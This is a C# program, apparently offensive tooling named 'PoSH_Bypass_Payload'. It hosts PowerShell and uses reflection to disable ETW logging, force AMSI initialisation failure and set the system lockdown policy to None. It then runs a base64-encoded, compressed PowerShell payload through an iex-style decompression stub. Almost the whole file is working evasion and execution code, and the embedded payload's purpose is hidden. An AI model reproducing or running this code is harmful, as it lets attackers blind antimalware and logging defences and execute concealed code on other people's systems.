using System;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Security;



//References
//  https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/
//  https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
//  https://tyranidslair.blogspot.co.uk/2017/08/copy-of-device-guard-on-windows-10-s.html

namespace PoSH_Bypass_Payload
{
    class Program
    { 
        static void Main(string[] args)
        {


        string Command = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAbgBWAFoAYgBjADkAbwA2AEUASAA3ADMAcgA5AEIANAAvAEkAQwBuAFcATwBDADAAUwBUAGsAdwBQAEIAQwBIAG4ASwBRAHAAQwBRAE4ATwBNADIAMgBhAE8AUwBQAHMAQgBSAFMATQA1AFUAaAB5AEMAYwAzAGgAdgA1ACsAVgB6AFMAMQBwADAAMwBaAE8ASgBnAC8AVwBhAG4AZQAvADMAVwA4AHYAdwBuAEoAVQAxAEwAYQBuAFcAbQBmAE4AVwBzADMALwA2ADQARAA2AFIAdwAxAGEAcAA3ADcAdgBOAHgAdAAxADIAMwBMAFUAcQA1AGMAMQBQAG0AYwBUAFUARABXAGwAbQBlAFoAUgBMAFIASwBwAGgAbABUAFgAYgBHAHUAYwBwADUASABtAEkAaQBWAEIAcAAwAGMAcQB6AGcAeQBXAFYAZQBmADgAawAvAHQAawBPAFkAeQAwAHkAUwBVAHMAdgBLAHYAUgBQAFUAUwBhAGUATwBFAHkAZwAwAHMAMgBCADIASQBQAGwAMAByAEQAbgBBADQAaAB5AGkAWABYAFMAeAByAEkAWgBhAGIARgBSAEwASgBzAHUAcQBRAEQAZgBwAC8ARwBEAEoASQBlAFMAeABFAHgAeABxAGcAWQA3AFkAawBZADAATgB2AHQATAB3ADAARABuAGsAMQBCAEcAdABXADcAWgBqAE0ANABEAG8AeABoAG4AOABVAHgAVAB5AGUALwB0AFYAMwByAHIAWQAyAC8AZwBCAFQASwBtAEIAOABuAEkAcABvAE4AKwBYAGMARAA3AGgAOAAwAGoATwBnAEMAbABtAHYAQgB3AGUARwBSAHgAYwBlAFkATQA2AFoATAByAEsAZgBOAE4ANQAyAEEATgBxAGwAVwBYAEYAcABrADYAOABFAEQAWgBxAHcAbAB1AHIAZQBOAEgAdgBvADQALwA3AFEAWABVAEMARABTAGIAeQBBADEAdwBwADUASwBNAFQAOQBtAEMAbwA3AGUAbABlAHEARgA1ADUAVQBGAGkAWQBJADkATwB4AFMAdQByAEYAVwBKAGgAbQB6AHYAbwBQAEgAdwBCADkAZwBZAC8AeAArAEMARwArAGYANwA2AEsAVwBsAEUAUgB0ADgAaAA2ADEAMgB0AGUAOQBlAEIAcAB2AGEANQA2AG0AcAAvAFcAZwBQAEkANABSAEgAVABiAHQAcABKAEEAegBEAGkASABRAGQAbgBqAGIAbwAzADYAQwBQAGwAeABwAFUAeABSAGkAVQB2AFcASQBhAHkAUABpAHcASABNAE0AdQBBAGcAWQBTAG0AQQBhADAATABDAG8AbABLADYAZwAzAE4AagBkAEEAUQA4AGwAUwBOAFIAWgB5AGYAcwBwAFQAbABoAFIAVgBxAGoAaQBqAEsAcQBsAFgAaQBUAE8AaQBIAHkARwBkADYASwBsAHIAMwBZADQAUQA0AGYAYgB1AGoAagBoAFoANgBSAEQANQBlADAATwBjAHMAZgBWAGoAOQBxAEYANABuAG4AdgBtAFcAbgB2AHAAbgBYAFMAMwA2AFUARQBhAHYAYwB6AHYAVgB4AHcAYQBkAGMAcwBwADYAegBhADYAcgBWAFAAcQBIADkANAA5AHoAOQBiAFUAMAAzAEwAaQAvAFkAeABQAFkAQwAvAGoAMwBOAHoARQByADIAYgBzAEgAKwAyAGwAVABEAHcAOAB1ADkAYgB2AGkATgA4AEUAbAA3AHQANwBPAGEATABjAHUANABGAFIAbABIAEMAYwBhADgAdwAyAEUARwBMAEcAdwBTAFYAUABaAFgAQQBWAGMAMwArAEMAdwBSAEgAdgBGAEsATgBnAG0AdABoAHgAWABPAHYAMQBhAGsAdgA4AHMAOQAxAFcAcQBYAFUAYgBvADQAYgBtAGMAegBOAEUAZgBTAFkAVgBkAEIAOQBaAHAAQwB0AE8AWABOADMAWAByAGoAcABwAG4AaQBUAEcAWgB2AGEANgBqAGYAMwBXAHIAOQBVAFAAYQB3AGQAMQB2ADIASAAvADMATABwAHMAZQB1AEkAbABHAGcAbgBDAFEATwBHAFIANgB4AFYAQgB4AGgAVABJADEASABSAC8AbQA5AGkANABQAFQASwBtADEARQBMAEkAZQBIAE8AVQA0AG4ARwBaAHkAMgBSADkAWABFAFQAUAB0ADkAUwBhAHUAawB2AFEARgBOAGsASQBDAGoAWgBhAHgATABLAGMAYQBSAHYAVgBDADAAaQBrAG0AYQBVAHgAcQBXAEMAWABLAEMAeQA4AFEAdgBZADAARwB5AFYAQQBnADQAKwBEAFQAKwBXAFoAOQB0AGkAOQBrAE0AUwBiAGEASABMAGcAdQBoAGcAYgA0AHQAQQB6AFkARABGAGUAMAAwADQAYwBWACsAdwB6AG8AVABTAG0ATQBsADEAUABHAEIAKwBqAFgALwBjAEoAMQA3AFAAawBtAFcANgB1ADkANwBEAEMAUgBlAHkAWQBpADEAZQBXAGIAMgB1AHIASAA3ADAAdwBzAEYAZgBXAEQANQBEAFgAeQBJAHYAWABtAGEAQQBsAEUAdABvAFQAMwAzAG0AUwBzAE4AbwBoAHIAWgBQAEsARABVADkAagBzAFYARABrAE0AaQBSAEgAOQBHADIATAAzAEYAegBkAEgATAAxAHIAawBWAEQAeQAyAE8AQwA4AHAAMwBVADgAaQBEAHkAYQB0AG8AagA4ADEAdgBSADkAVwBuAGQASgB3AG0AZQBBAFQAUgBQAE4AaABPADMAKwBpAEQAVwBBAE0AVQBpAFEAQwBJAFMAMwBCAFcAcwBiADMAbwB1AE8AVwBtAFMALwBZAHIAMQB2AFYASABjAFcAVgBVAGYATABIAEYAeQBzAFEAdQBGAG8AVwA5ADYAaQBDAHQAdgB5AEYAbgA3ADcAdwA2AEUAWgByAFgASQBnAFEAKwBFAFYAeQB4ADcASwBmAHQAKwBwAEUAcQArAGoAKwBnAG4AagBxAFIAbQBRAG8AcAA4AGoAUQBPADgATwBMAHMAOQBJAFEAcQB6AFEAUgBZAHEAeABpAFQASQAyAFYAYwBZADIATAA1ADYAagBPAGYASgBCAFcAYQA0AEYAVABvAEMAcABjADMAKwBJAEkAMgB0AEkANABpAHcAaAAyADkAQwBxAEoAaABEAGoAYwBaAEgAUgAzAGIAMwB4AHUAOABWAG8AVwBTAHQAUwByAE4AWQBuAFkAcwBqAEQAMgBwAHoAQQBtAE8AVwBKAGYAcQBGAHYAVQBtACsAUgBzAHAAbwBGAEwAMABhADQAeQBGAEMAMABNAGIAZgArAHcASAA1AG4ALwBqAEkAZQBsAE8AOQBKAFQARgBRAEYAeQBkAEYAbQArAHMAbgBMADAAdAA3AHUAMQBlAG8ATQBXADIANABBAEQAegBrAG8AWABhAHEAWQBoADcAZQB3AHIATwBLAHoAQQA4AHEATQB3AHYAbABKAGUANwAxAEwAOABBAFUAcQA4AHMARABRAGQAMgBzAG4AawB6AGoANQBrAHEAeQBmAE0ARQBpAC8ATgBYAGYAMQBOAFkAKwBYAFUAdwBvAGoATQBjADkAeQBYAFYANgA0AGoAbwAyAFQAawByAGQAdABiAE4AZgBPAGQAWABoADIATgBUAGcAUABQADMAOABkAGYAaAA2AEcAMwBaADYAOQBNAHEAeQBZADIAMgBlACsARQBGAGUAMAA3AGEAMABvAHgAdgBMAHgAOQBLAHUAVAB0ADgAegAvAFMALwArAGwAcABEACsANABDAHIAcgBEADQAZABYAGcAbgA4ADQAZwBPAEQAcwBQAHUAMABGADQAUABlAGkAMgBuAEkAegBIAHIAWgAvADkAUgBqAEsAcgBKAFcAdgBqAHYAaQBlAGUAMgBlAHIAOABjAFgAagBkAFcAQwBZAFgAMQAzAEEAdgBwAHQARgBKAGUAdABGAFkAOQBrAGQAeAAvAGMATwA0AEYANwAwAFoAeAAxAC8AZwA0ADgAWAA3ADIAawBPADMASQA5AGkASABXAFoAdAA0AGUAVQBvAGMAWQBYAFoAVABRAGMAWgA2ADIAKwA2ADIAcwBWAGMAUwBpAEIAMgBjAHUAUgBRAG4ATgBVADAARQBpADkAVgA2AGkAeQB2AFgAaQB1AEYALwBvAFoAcABnADEANQBoAG0AYgAyADcAUgB5ADQALwBOADIASgBwAHYAcwA4AEgASwByADMAOABKAGgAOABkAE4ANwAxAG0ANABrAEsAVAAyAFYAQQBLAFEARQBiADkAUgByADEAdAByAEgANABVAFcAVwBmADAASAAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA"));

            using (PowerShell powerShellInstance = PowerShell.Create())
            {
                var psEtwLogProvider = powerShellInstance.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                if (psEtwLogProvider != null)
                {
                    var etwProvider = psEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                    var eventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                    etwProvider.SetValue(null, eventProvider);
                }

                var amsi = powerShellInstance.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
                var amsifield = amsi.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                amsifield.SetValue(null, true);

                var fi = typeof(SystemPolicy).GetField("systemLockdownPolicy", BindingFlags.NonPublic | BindingFlags.Static);
                fi.SetValue(null, SystemEnforcementMode.None);
                
                powerShellInstance.AddScript(Command);
                powerShellInstance.Invoke();
            }
        }
    }
}
